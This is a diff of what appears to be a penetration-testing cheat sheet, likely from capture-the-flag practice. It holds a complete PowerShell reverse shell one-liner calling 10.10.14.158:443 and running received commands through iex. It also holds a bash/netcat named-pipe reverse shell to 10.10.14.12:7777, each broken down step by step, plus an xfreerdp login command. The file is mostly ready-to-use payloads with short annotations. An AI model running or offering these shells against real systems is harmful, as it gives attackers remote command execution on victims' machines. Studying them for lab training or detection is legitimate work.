@@ -1,8 +1,70 @@
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
+Calling powershell
+powershell -nop -c 
+
+
+binding a socket
+"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
+
+
+Setting the connection stream
+$stream = $client.GetStream();
+
+
+Empty byte stream
+[byte[]]$bytes = 0..65535|%{0}; 
+
+
+Stream parameters
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+
+
+Set byte encoding 
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+
+
+Invoke expression
+$sendback = (iex $data 2>&1 | Out-String ); 
+
+
+Show working directory
+$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
+
+
+Send byte
+$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+
+
+Terminate connection
+$client.Close()"
+
+
+
+
+netcat bash reverse shell oneliner
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 
 
-
+rdp connect from linux to windows
 xfreerdp /u:WindowsUsername /p:WindowsPassword /v:your.windows.ip.address
+
+removes the file if it already exists
+rm -f /tmp/f; 
+
+create named pipe 
+mkfifo /tmp/f; 
+
+output redirection
+cat /tmp/f | 
+
+
+set shell options
+/bin/bash -i 2>&1 | 
+
+
+open a connection with netcat
+nc 10.10.14.12 7777 > /tmp/f  
+
+
